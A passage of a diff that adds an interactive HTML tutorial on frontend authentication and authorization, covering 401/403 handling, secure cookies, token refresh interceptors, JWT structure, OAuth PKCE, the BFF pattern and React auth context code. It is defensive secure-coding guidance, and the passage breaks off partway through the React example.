+  p:last-child { margin-bottom: 0; }
+
+  strong { color: var(--text); font-weight: 500; }
+</style>
+</head>
+<body>
+
+<!-- Progress bar -->
+<div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+
+<!-- Sidebar -->
+<nav class="sidebar">
+  <div class="sidebar-logo">
+    <div class="logo-badge">frontend-auth</div>
+  </div>
+
+  <div class="sidebar-title">Contents</div>
+
+  <a class="nav-item active" href="#intro" onclick="setActive(this)">
+    <span class="nav-dot"></span> Introduction
+  </a>
+  <a class="nav-item" href="#authn-authz" onclick="setActive(this)">
+    <span class="nav-dot"></span> AuthN vs AuthZ
+  </a>
+  <a class="nav-item" href="#sessions" onclick="setActive(this)">
+    <span class="nav-dot"></span> Sessions & Cookies
+  </a>
+  <a class="nav-item" href="#tokens" onclick="setActive(this)">
+    <span class="nav-dot"></span> Bearer Tokens
+  </a>
+  <a class="nav-item" href="#jwt" onclick="setActive(this)">
+    <span class="nav-dot"></span> JWT Deep Dive
+  </a>
+  <a class="nav-item" href="#oauth" onclick="setActive(this)">
+    <span class="nav-dot"></span> OAuth & OIDC
+  </a>
+  <a class="nav-item" href="#react" onclick="setActive(this)">
+    <span class="nav-dot"></span> React Patterns
+  </a>
+  <a class="nav-item" href="#security" onclick="setActive(this)">
+    <span class="nav-dot"></span> XSS & Storage
+  </a>
+  <a class="nav-item" href="#checklist" onclick="setActive(this)">
+    <span class="nav-dot"></span> Do / Don't
+  </a>
+</nav>
+
+<!-- Main -->
+<main class="main">
+
+  <!-- ── Hero ── -->
+  <section class="hero" id="intro">
+    <div class="hero-tag">Frontend Security</div>
+    <h1 class="fade-up">
+      Authentication &<br/><span class="grad">Authorization</span>
+    </h1>
+    <p class="hero-sub fade-up fade-up-1">
+      A complete frontend engineer's guide — from login flows and JWT tokens to OAuth, React patterns, secure storage, and real-world pitfalls. Not just theory. What you actually do in code.
+    </p>
+    <div class="hero-meta fade-up fade-up-2">
+      <div class="meta-pill"><span class="dot dot-blue"></span> Sessions & Tokens</div>
+      <div class="meta-pill"><span class="dot dot-purple"></span> JWT & OAuth / OIDC</div>
+      <div class="meta-pill"><span class="dot dot-green"></span> React Implementation</div>
+    </div>
+  </section>
+
+  <!-- ── Why it matters ── -->
+  <section class="section" style="padding-bottom: 40px; border-bottom: none;">
+    <div class="section-label">Why this matters</div>
+    <div class="section-title">What bad auth knowledge looks like in your code</div>
+    <p class="section-intro">
+      Auth bugs aren't always dramatic hacks — they're often subtle UI logic errors that create false confidence or broken experiences. Here's what gets shipped when you skip this.
+    </p>
+
+    <div class="danger-box">
+      <h4>⚠ Common frontend auth failures</h4>
+      <div class="danger-item">
+        <span class="di-label">Token in localStorage</span>
+        <span>XSS script on your page? Token stolen instantly. Any injected JS can read <code>localStorage</code> without restriction.</span>
+      </div>
+      <div class="danger-item">
+        <span class="di-label">Hide menu = secure</span>
+        <span>Hiding a button doesn't protect the API route. The backend has to enforce access — you're just hiding UI, not enforcing authorization.</span>
+      </div>
+      <div class="danger-item">
+        <span class="di-label">401 vs 403 mix-up</span>
+        <span>Redirecting to login on a 403 creates an infinite loop for authenticated users who simply lack permission. Different errors, different UX.</span>
+      </div>
+      <div class="danger-item">
+        <span class="di-label">Parallel refresh calls</span>
+        <span>Five simultaneous 401 responses trigger five refresh calls. Race condition — some succeed, some fail, token state is corrupted.</span>
+      </div>
+    </div>
+
+    <div class="callout callout-info">
+      <span class="callout-icon">💡</span>
+      <div class="callout-body">
+        <strong>The rule:</strong> Backend owns authorization. Frontend owns <strong>the flow, the UX, and correct signal handling</strong>. Your job is to show the right state and guide the user — not to be the security layer.
+      </div>
+    </div>
+  </section>
+
+  <!-- ── AuthN vs AuthZ ── -->
+  <section class="section" id="authn-authz">
+    <div class="section-label">Core concepts</div>
+    <div class="section-title">Authentication vs Authorization</div>
+    <p class="section-intro">
+      Two words that look similar, mean completely different things, and produce completely different HTTP errors when they fail.
+    </p>
+
+    <div class="cards-grid">
+      <div class="concept-card card-blue">
+        <span class="card-icon">🪪</span>
+        <div class="card-title">Authentication (AuthN)</div>
+        <div class="card-body">
+          <strong>Who are you?</strong> The system verifies your claimed identity using proof — password, OTP, biometric, magic link, etc. It's about identity verification, not what you can do.
+          <div class="card-analogy">🏢 Analogy: Security checks your ID badge at the office entrance. You scan in — identity confirmed.</div>
+        </div>
+      </div>
+
+      <div class="concept-card card-purple">
+        <span class="card-icon">🔑</span>
+        <div class="card-title">Authorization (AuthZ)</div>
+        <div class="card-body">
+          <strong>What are you allowed to do?</strong> After identity is confirmed, the system decides which resources, pages, or operations you can access, based on your roles and permissions.
+          <div class="card-analogy">🏢 Analogy: You're inside the office. Your keycard opens the dev floor but not the C-suite. Same building, different access.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HTTP Status cards interactive -->
+    <div style="margin-bottom: 16px; font-family: var(--mono); font-size: 12px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em;">
+      Click each status to see details ↓
+    </div>
+
+    <div class="status-row">
+      <div class="status-card s401" onclick="toggleStatus(this)">
+        <div class="status-code">401</div>
+        <div class="status-name">Unauthorized</div>
+        <div class="status-desc">No proof of identity — token missing, expired, or invalid. Authentication failed.</div>
+        <div class="status-detail">
+          <strong style="color: var(--orange);">Frontend response:</strong> Redirect to login, clear stored token, prompt re-authentication.<br/><br/>
+          <strong style="color: var(--orange);">Common cause:</strong> JWT expired, no <code>Authorization</code> header sent, malformed token.<br/><br/>
+          <strong style="color: var(--orange);">React:</strong> Trigger refresh flow → if refresh fails, redirect to <code>/login</code>.
+        </div>
+      </div>
+
+      <div class="status-card s403" onclick="toggleStatus(this)">
+        <div class="status-code">403</div>
+        <div class="status-name">Forbidden</div>
+        <div class="status-desc">Identity confirmed, but permission denied. You're in the building, wrong room.</div>
+        <div class="status-detail">
+          <strong style="color: var(--red);">Frontend response:</strong> Show an "access denied" message. Do NOT redirect to login — the user is already authenticated.<br/><br/>
+          <strong style="color: var(--red);">Common cause:</strong> User lacks the required role, resource belongs to another user.<br/><br/>
+          <strong style="color: var(--red);">React:</strong> Render a <code>&lt;Forbidden /&gt;</code> component or inline message — not a login redirect.
+        </div>
+      </div>
+    </div>
+
+    <!-- Compare table -->
+    <table class="compare-table">
+      <thead>
+        <tr>
+          <th>Dimension</th>
+          <th>AuthN</th>
+          <th>AuthZ</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Question</td>
+          <td>Who are you?</td>
+          <td>What can you do?</td>
+        </tr>
+        <tr>
+          <td>Example</td>
+          <td>Email + password login</td>
+          <td>Only admins see /admin panel</td>
+        </tr>
+        <tr>
+          <td>HTTP error</td>
+          <td><span class="badge badge-orange">401</span></td>
+          <td><span class="badge badge-red">403</span></td>
+        </tr>
+        <tr>
+          <td>Token involved</td>
+          <td>Verifies token signature/expiry</td>
+          <td>Reads claims inside token</td>
+        </tr>
+        <tr>
+          <td>Frontend action</td>
+          <td>Re-authenticate, refresh token</td>
+          <td>Show access denied UI, not login</td>
+        </tr>
+        <tr>
+          <td>Backend action</td>
+          <td>Validate identity credentials</td>
+          <td>Check RBAC / permissions</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-warn">
+      <span class="callout-icon">⚠️</span>
+      <div class="callout-body">
+        Mixing up 401 and 403 is one of the most common bugs in frontend auth. A 403 on <code>/api/admin</code> for a non-admin user should <strong>never</strong> redirect to login — they're already logged in. Show a "not authorized" page instead.
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Sessions ── -->
+  <section class="section" id="sessions">
+    <div class="section-label">Session management</div>
+    <div class="section-title">Sessions & Cookies — The Browser Side</div>
+    <p class="section-intro">
+      Session-based auth predates tokens. The server creates a session, and the browser holds just an identifier — not the full user data. Here's what you need to understand as a frontend engineer.
+    </p>
+
+    <!-- Flow diagram -->
+    <div class="flow-diagram">
+      <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.08em;">Session login flow</div>
+      <div class="flow-steps">
+        <div class="flow-step">
+          <div class="flow-box fbox-blue">Browser</div>
+          <div class="flow-label">User</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box fbox-purple">POST /login<br/>credentials</div>
+          <div class="flow-label">HTTP request</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box fbox-orange">Server creates<br/>session</div>
+          <div class="flow-label">Session store</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box fbox-cyan">Set-Cookie:<br/>session_id=…</div>
+          <div class="flow-label">Response header</div>
+        </div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">
+          <div class="flow-box fbox-green">Cookie stored<br/>auto-sent</div>
+          <div class="flow-label">Subsequent requests</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">🍪</span>
+            <span class="acc-title">HttpOnly — Why JavaScript Can't Read It</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p>When the server sets a cookie with the <code>HttpOnly</code> flag, the browser stores it but <strong>completely blocks JavaScript access</strong>. <code>document.cookie</code> won't return it. No XSS payload can steal it.</p>
+            <p>This is the primary defense for session IDs and refresh tokens. If your refresh token lives in an <code>HttpOnly</code> cookie, even a fully compromised XSS attack can't read it with JS — though they can still send requests <em>using</em> it (CSRF concern).</p>
+            <div class="code-block">
+              <div class="code-header">
+                <div class="dots"><span></span><span></span><span></span></div>
+                <span class="code-lang">HTTP Response Header</span>
+                <button class="code-copy" onclick="copyCode(this)">copy</button>
+              </div>
+              <div class="code-body">Set-Cookie: <span class="str">session_id=abc123</span>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">🛡️</span>
+            <span class="acc-title">SameSite — Reducing CSRF Risk</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p><strong>CSRF (Cross-Site Request Forgery)</strong>: a malicious site tricks the user's browser into sending a cookie-authenticated request to <em>your</em> server. The cookie goes along automatically.</p>
+            <p>The <code>SameSite</code> attribute controls when cookies are sent with cross-origin requests:</p>
+            <table class="compare-table" style="margin-top: 12px;">
+              <thead><tr><th>Value</th><th>Behavior</th><th>Use case</th></tr></thead>
+              <tbody>
+                <tr><td>Strict</td><td>Never on cross-site requests</td><td>High-security, breaks OAuth flows</td></tr>
+                <tr><td>Lax</td><td>Top-level navigations only</td><td>Modern default, good balance</td></tr>
+                <tr><td>None</td><td>Always sent cross-site</td><td>Must pair with Secure; CSRF risk</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">🚪</span>
+            <span class="acc-title">Logout — What You Must Not Forget</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p>Logout is not just <code>setUser(null)</code>. If you only clear React state, the session still exists on the server. A page refresh re-authenticates the user silently via the cookie.</p>
+            <p><strong>Complete logout flow:</strong></p>
+            <div class="code-block">
+              <div class="code-header">
+                <div class="dots"><span></span><span></span><span></span></div>
+                <span class="code-lang">JavaScript</span>
+                <button class="code-copy" onclick="copyCode(this)">copy</button>
+              </div>
+              <div class="code-body"><span class="kw">async function</span> <span class="fn">logout</span>() {
+  <span class="cmt">// 1. Tell the server to invalidate the session</span>
+  <span class="kw">await</span> api.<span class="fn">post</span>(<span class="str">'/auth/logout'</span>);
+
+  <span class="cmt">// 2. Clear all client state</span>
+  <span class="fn">setUser</span>(<span class="kw">null</span>);
+  accessToken = <span class="kw">null</span>;
+
+  <span class="cmt">// 3. Redirect away from authenticated area</span>
+  router.<span class="fn">replace</span>(<span class="str">'/login'</span>);
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Tokens ── -->
+  <section class="section" id="tokens">
+    <div class="section-label">Token-based auth</div>
+    <div class="section-title">Bearer Tokens — Access & Refresh</div>
+    <p class="section-intro">
+      Modern APIs use stateless tokens. The server doesn't store sessions — it trusts a signed token. Your job as frontend: get the token, attach it, refresh it before it dies, handle failures gracefully.
+    </p>
+
+    <!-- Mode toggle -->
+    <div class="mode-toggle">
+      <span class="mode-toggle-label">beginner</span>
+      <label class="toggle-switch">
+        <input type="checkbox" id="modeToggle" onchange="toggleMode(this)" />
+        <div class="toggle-track">
+          <div class="toggle-thumb"></div>
+        </div>
+      </label>
+      <span class="mode-toggle-label">advanced</span>
+    </div>
+
+    <div id="token-content">
+      <!-- Beginner -->
+      <div class="beginner-only">
+        <div class="callout callout-info">
+          <span class="callout-icon">📖</span>
+          <div class="callout-body">
+            <strong>Simple version:</strong> After login, the server gives you a token (a long string). You attach it to every API request in the <code>Authorization</code> header. Like showing your ticket at every door inside a venue — once issued, no desk needed.
+          </div>
+        </div>
+      </div>
+
+      <!-- Advanced -->
+      <div class="advanced-only">
+        <div class="callout callout-info">
+          <span class="callout-icon">⚙️</span>
+          <div class="callout-body">
+            <strong>Advanced:</strong> Access tokens are short-lived (minutes–hours), stateless, and signed. Refresh tokens are long-lived (days–weeks), stateful (server can revoke), and should never go in JS-accessible storage. The two-token pattern lets you balance security and UX.
+          </div>
+        </div>
+      </div>
+
+      <div class="cards-grid">
+        <div class="concept-card card-blue">
+          <span class="card-icon">⚡</span>
+          <div class="card-title">Access Token</div>
+          <div class="card-body">
+            Short-lived (typically 5–60 min). Sent on <strong>every API request</strong> in the <code>Authorization: Bearer …</code> header. Stateless — the server validates signature without a database lookup.
+          </div>
+        </div>
+        <div class="concept-card card-purple">
+          <span class="card-icon">🔄</span>
+          <div class="card-title">Refresh Token</div>
+          <div class="card-body">
+            Long-lived (hours–days). Used <strong>only</strong> to get a new access token when it expires. Should be stored in an <code>HttpOnly</code> cookie or managed via a BFF. Never in <code>localStorage</code>.
+          </div>
+        </div>
+      </div>
+
+      <!-- Request interceptor code -->
+      <div class="code-block">
+        <div class="code-header">
+          <div class="dots"><span></span><span></span><span></span></div>
+          <span class="code-lang">JavaScript — Axios Interceptor</span>
+          <button class="code-copy" onclick="copyCode(this)">copy</button>
+        </div>
+        <div class="code-body"><span class="cmt">// Attach token to every outgoing request</span>
+api.interceptors.request.<span class="fn">use</span>((config) => {
+  <span class="kw">if</span> (accessToken) {
+    config.headers.<span class="const">Authorization</span> = <span class="str">`Bearer <span class="kw">${accessToken}</span>`</span>;
+  }
+  <span class="kw">return</span> config;
+});
+
+<span class="cmt">// Handle 401 — refresh once, then retry</span>
+<span class="kw">let</span> refreshPromise = <span class="kw">null</span>;
+
+api.interceptors.response.<span class="fn">use</span>(
+  (res) => res,
+  <span class="kw">async</span> (error) => {
+    <span class="kw">if</span> (error.response?.status !== <span class="num">401</span>) <span class="kw">throw</span> error;
+
+    <span class="cmt">// Single refresh promise — prevents parallel refresh calls</span>
+    refreshPromise ??= api
+      .<span class="fn">post</span>(<span class="str">'/auth/refresh'</span>)
+      .<span class="fn">then</span>((res) => { accessToken = res.data.accessToken; })
+      .<span class="fn">finally</span>(() => { refreshPromise = <span class="kw">null</span>; });
+
+    <span class="kw">await</span> refreshPromise;
+    <span class="kw">return</span> api(error.config); <span class="cmt">// retry original request</span>
+  }
+);</div>
+      </div>
+
+      <div class="callout callout-warn">
+        <span class="callout-icon">⚠️</span>
+        <div class="callout-body">
+          The <code>refreshPromise ??= …</code> pattern is critical. Without it, 5 simultaneous 401 responses spawn 5 refresh calls — creating a race condition where some get new tokens and some fail with an already-used refresh token.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── JWT ── -->
+  <section class="section" id="jwt">
+    <div class="section-label">JSON Web Token</div>
+    <div class="section-title">JWT — What Frontend Engineers Need to Know</div>
+    <p class="section-intro">
+      JWTs are widely misunderstood. They are <strong>not encrypted</strong> — anyone with the token can read the payload. Security comes from the server verifying the signature, not from hiding the data.
+    </p>
+
+    <!-- JWT visualizer -->
+    <div class="jwt-visualizer">
+      <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.08em;">JWT structure — the three parts</div>
+      <div class="jwt-string">
+        <span class="jwt-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="jwt-dot">.</span><span class="jwt-p">eyJzdWIiOiJ1c2VyXzEyMyIsImVtYWlsIjoiam9obi5kb2VAZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDk4MjM0MDB9</span><span class="jwt-dot">.</span><span class="jwt-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+      </div>
+      <div class="jwt-parts">
+        <div class="jwt-part jwt-part-header">
+          <div class="jwt-part-title">Header</div>
+          <div class="jwt-part-body">
+            <strong style="color: var(--orange);">Algorithm + type</strong><br/>
+            <code style="color: var(--orange);">"alg": "HS256"</code><br/>
+            <code style="color: var(--orange);">"typ": "JWT"</code><br/><br/>
+            Base64URL encoded. Not encrypted.
+          </div>
+        </div>
+        <div class="jwt-part jwt-part-payload">
+          <div class="jwt-part-title">Payload (Claims)</div>
+          <div class="jwt-part-body">
+            <code style="color: var(--blue2);">sub</code> — user ID<br/>
+            <code style="color: var(--blue2);">exp</code> — expiry (Unix timestamp)<br/>
+            <code style="color: var(--blue2);">iat</code> — issued at<br/>
+            <code style="color: var(--blue2);">role</code> — custom claim<br/><br/>
+            ⚠️ Fully readable. No secrets here.
+          </div>
+        </div>
+        <div class="jwt-part jwt-part-sig">
+          <div class="jwt-part-title">Signature</div>
+          <div class="jwt-part-body">
+            <code style="color: var(--purple2);">HMAC(header + "." + payload, secret)</code><br/><br/>
+            Server signs with secret key. Tamper with payload → signature mismatch → rejected.<br/><br/>
+            You verify on <strong>server only</strong>.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- JWT interactive decoder -->
+    <div class="code-block" style="margin-top: 20px;">
+      <div class="code-header">
+        <div class="dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">Interactive JWT Decoder</span>
+        <span style="font-size: 11px; color: var(--text3);">paste any JWT to decode payload</span>
+      </div>
+      <div class="code-body" style="padding-bottom: 8px;">
+        <textarea id="jwt-demo-input" placeholder="Paste a JWT here… e.g. eyJhbGci..."></textarea>
+        <button class="demo-btn" onclick="decodeJWT()">▶ Decode Payload</button>
+        <div id="jwt-demo-output" style="display:none;"></div>
+      </div>
+    </div>
+
+    <div class="accordion" style="margin-top: 20px;">
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">🕰️</span>
+            <span class="acc-title">Handling Expiry (exp) — Frontend Responsibility</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p>The <code>exp</code> claim is a Unix timestamp. You can decode the JWT on the frontend and proactively refresh <em>before</em> it expires — avoiding the 401 → refresh → retry cycle entirely.</p>
+            <div class="code-block">
+              <div class="code-header">
+                <div class="dots"><span></span><span></span><span></span></div>
+                <span class="code-lang">JavaScript</span>
+                <button class="code-copy" onclick="copyCode(this)">copy</button>
+              </div>
+              <div class="code-body"><span class="kw">function</span> <span class="fn">isTokenExpiringSoon</span>(token, bufferSecs = <span class="num">60</span>) {
+  <span class="kw">const</span> [, payload] = token.<span class="fn">split</span>(<span class="str">'.'</span>);
+  <span class="kw">const</span> { exp } = <span class="const">JSON</span>.<span class="fn">parse</span>(<span class="fn">atob</span>(payload));
+  <span class="kw">const</span> nowSecs = <span class="const">Date</span>.<span class="fn">now</span>() / <span class="num">1000</span>;
+  <span class="kw">return</span> exp - nowSecs &lt; bufferSecs; <span class="cmt">// refresh if < 60s left</span>
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">🚫</span>
+            <span class="acc-title">What NEVER Goes in JWT Payload</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p>Since the payload is Base64-encoded, not encrypted, anyone who intercepts the token can read it. Decode it at <a href="https://jwt.io" style="color: var(--blue2);" target="_blank" rel="noopener noreferrer">jwt.io</a> yourself and see.</p>
+            <div style="display: flex; gap: 12px; margin-top: 12px; flex-wrap: wrap;">
+              <div style="flex: 1; min-width: 180px;">
+                <div style="font-family: var(--mono); font-size: 11px; color: var(--red); margin-bottom: 8px; text-transform: uppercase;">❌ Never include</div>
+                <div class="check-item"><span class="ci-icon">🔴</span>User passwords or password hashes</div>
+                <div class="check-item"><span class="ci-icon">🔴</span>Credit card / payment data</div>
+                <div class="check-item"><span class="ci-icon">🔴</span>Full PII (SSN, full address)</div>
+                <div class="check-item"><span class="ci-icon">🔴</span>API keys or secrets</div>
+              </div>
+              <div style="flex: 1; min-width: 180px;">
+                <div style="font-family: var(--mono); font-size: 11px; color: var(--green); margin-bottom: 8px; text-transform: uppercase;">✅ Safe to include</div>
+                <div class="check-item"><span class="ci-icon">🟢</span>User ID (sub)</div>
+                <div class="check-item"><span class="ci-icon">🟢</span>Roles / permissions</div>
+                <div class="check-item"><span class="ci-icon">🟢</span>Tenant ID</div>
+                <div class="check-item"><span class="ci-icon">🟢</span>Expiry (exp), issued at (iat)</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── OAuth / OIDC ── -->
+  <section class="section" id="oauth">
+    <div class="section-label">OAuth 2.0 & OpenID Connect</div>
+    <div class="section-title">"Sign in with Google" — How It Actually Works</div>
+    <p class="section-intro">
+      OAuth 2.0 delegates authorization to a third-party platform. OIDC adds identity on top. For SPAs, the correct flow is <strong>Authorization Code + PKCE</strong> — the older Implicit flow is deprecated and insecure.
+    </p>
+
+    <div class="tabs-wrapper">
+      <div class="tab-nav">
+        <button class="tab-btn active" onclick="switchTab(this, 'tab-pkce')">Auth Code + PKCE</button>
+        <button class="tab-btn" onclick="switchTab(this, 'tab-implicit')">Implicit (Deprecated)</button>
+        <button class="tab-btn" onclick="switchTab(this, 'tab-oidc')">OIDC & ID Token</button>
+        <button class="tab-btn" onclick="switchTab(this, 'tab-bff')">BFF Pattern</button>
+      </div>
+
+      <div class="tab-panel active" id="tab-pkce">
+        <div class="oauth-flow">
+          <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.08em;">Authorization Code + PKCE Flow — recommended for SPAs</div>
+          <div class="oauth-steps">
+            <div class="oauth-step">
+              <div class="step-num">1</div>
+              <div class="step-content">
+                <div class="step-title">Generate PKCE verifier + challenge</div>
+                <div class="step-desc">SPA creates a random <code>code_verifier</code>, hashes it to <code>code_challenge</code> (SHA-256). This pair proves the exchange later.</div>
+                <div class="step-code">crypto.subtle.digest('SHA-256', encoder.encode(verifier))</div>
+              </div>
+            </div>
+            <div class="oauth-step">
+              <div class="step-num">2</div>
+              <div class="step-content">
+                <div class="step-title">Redirect to Identity Provider (IdP)</div>
+                <div class="step-desc">Browser is redirected to Google/GitHub/etc. login page with <code>client_id</code>, <code>redirect_uri</code>, <code>code_challenge</code>, and <code>scope</code>.</div>
+                <div class="step-code">GET /authorize?response_type=code&code_challenge=…</div>
+              </div>
+            </div>
+            <div class="oauth-step">
+              <div class="step-num">3</div>
+              <div class="step-content">
+                <div class="step-title">User authenticates at IdP</div>
+                <div class="step-desc">User enters credentials on the IdP's page — your app never sees the password. IdP issues an authorization <strong>code</strong> (not a token).</div>
+              </div>
+            </div>
+            <div class="oauth-step">
+              <div class="step-num">4</div>
+              <div class="step-content">
+                <div class="step-title">Callback with authorization code</div>
+                <div class="step-desc">IdP redirects back to your <code>redirect_uri</code> with a short-lived <code>?code=…</code> in the URL. This code is useless without the PKCE verifier.</div>
+                <div class="step-code">GET /callback?code=AUTH_CODE&state=…</div>
+              </div>
+            </div>
+            <div class="oauth-step">
+              <div class="step-num">5</div>
+              <div class="step-content">
+                <div class="step-title">Exchange code for tokens (backend/BFF preferred)</div>
+                <div class="step-desc">Server POSTs code + code_verifier to IdP's token endpoint. IdP verifies the PKCE pair and returns access + refresh + ID tokens.</div>
+                <div class="step-code">POST /token {code, code_verifier, client_secret}</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="tab-implicit">
+        <div class="callout callout-danger">
+          <span class="callout-icon">❌</span>
+          <div class="callout-body">
+            <strong>Implicit flow is deprecated.</strong> It returned access tokens directly in the URL fragment (<code>#access_token=…</code>), exposing them in browser history, server logs, and referrer headers. Know it for interviews — don't implement it.
+          </div>
+        </div>
+        <div class="callout callout-info">
+          <span class="callout-icon">💡</span>
+          <div class="callout-body">
+            The fix: Authorization Code + PKCE achieves the same result for SPAs (no client secret needed) but never exposes tokens in the URL. Always use PKCE for browser-based apps.
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="tab-oidc">
+        <p style="color: var(--text2); margin-bottom: 16px;">OpenID Connect (OIDC) is a thin identity layer built on OAuth 2.0. Where OAuth gives you an <strong>access token</strong> for resource access, OIDC also gives you an <strong>ID token</strong> that contains user identity claims.</p>
+        <div class="cards-grid">
+          <div class="concept-card card-blue">
+            <span class="card-icon">🎫</span>
+            <div class="card-title">Access Token (OAuth)</div>
+            <div class="card-body">Used to call protected APIs on behalf of the user. Opaque or JWT. Server validates it. Frontend sends it in <code>Authorization</code> header.</div>
+          </div>
+          <div class="concept-card card-purple">
+            <span class="card-icon">🪪</span>
+            <div class="card-title">ID Token (OIDC)</div>
+            <div class="card-body">Always a JWT. Contains user identity: <code>sub</code>, <code>email</code>, <code>name</code>, <code>picture</code>. Used by the <em>client</em> to display user info — not sent to APIs.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="tab-bff">
+        <p style="color: var(--text2); margin-bottom: 16px;">The <strong>Backend For Frontend (BFF)</strong> pattern is increasingly the recommended approach for SPAs. Instead of the browser handling tokens directly, a thin server layer manages the OAuth flow and stores tokens in server-side sessions.</p>
+        <div class="flow-diagram">
+          <div class="flow-steps">
+            <div class="flow-step">
+              <div class="flow-box fbox-blue">SPA<br/>(Browser)</div>
+              <div class="flow-label">No tokens</div>
+            </div>
+            <div class="flow-arrow">⟷</div>
+            <div class="flow-step">
+              <div class="flow-box fbox-orange">BFF<br/>(Your server)</div>
+              <div class="flow-label">Holds tokens</div>
+            </div>
+            <div class="flow-arrow">⟷</div>
+            <div class="flow-step">
+              <div class="flow-box fbox-cyan">IdP<br/>(OAuth)</div>
+              <div class="flow-label">Issues tokens</div>
+            </div>
+          </div>
+        </div>
+        <div class="callout callout-success">
+          <span class="callout-icon">✅</span>
+          <div class="callout-body">
+            With BFF: tokens never touch the browser. SPA communicates with BFF via <code>HttpOnly</code> cookies. BFF attaches the access token to upstream API calls. XSS cannot steal tokens.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── React ── -->
+  <section class="section" id="react">
+    <div class="section-label">React implementation</div>
+    <div class="section-title">Auth in React — Patterns That Scale</div>
+    <p class="section-intro">
+      How you structure auth state in React determines whether your app stays maintainable. Here's the architecture that senior engineers use.
+    </p>
+
+    <!-- React architecture diagram -->
+    <div class="react-arch">
+      <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.08em;">Component tree — auth architecture</div>
+      <div class="arch-row">
+        <div class="arch-box ab-provider">AuthProvider (Context / Zustand)</div>
+      </div>
+      <div class="arch-row" style="padding-left: 24px;">
+        <div class="arch-arrow">└─</div>
+        <div class="arch-box ab-router">Router</div>
+      </div>
+      <div class="arch-row" style="padding-left: 48px;">
+        <div class="arch-arrow">├─</div>
+        <div class="arch-box ab-public">PublicRoute → /login, /register</div>
+      </div>
+      <div class="arch-row" style="padding-left: 48px;">
+        <div class="arch-arrow">└─</div>
+        <div class="arch-box ab-protected">ProtectedRoute → /dashboard, /settings</div>
+      </div>
+      <div class="arch-row" style="padding-left: 72px;">
+        <div class="arch-arrow">└─</div>
+        <div class="arch-box ab-api">API Layer (interceptors + token)</div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">React — AuthContext + Provider</span>
+        <button class="code-copy" onclick="copyCode(this)">copy</button>
+      </div>
+      <div class="code-body"><span class="kw">const</span> <span class="const">AuthContext</span> = <span class="fn">createContext</span>(<span class="kw">null</span>);
+
+<span class="kw">export function</span> <span class="fn">AuthProvider</span>({ children }) {
+  <span class="kw">const</span> [user, setUser] = <span class="fn">useState</span>(<span class="kw">null</span>);
+  <span class="kw">const</span> [loading, setLoading] = <span class="fn">useState</span>(<span class="kw">true</span>);
+
+  <span class="cmt">// Rehydrate session on mount</span>
+  <span class="fn">useEffect</span>(<span class="kw">async</span> () => {
+    <span class="kw">try</span> {
+      <span class="kw">const</span> { data } = <span class="kw">await</span> api.<span class="fn">get</span>(<span class="str">'/auth/me'</span>);
+      <span class="fn">setUser</span>(data.user);
+    } <span class="kw">catch</span> {
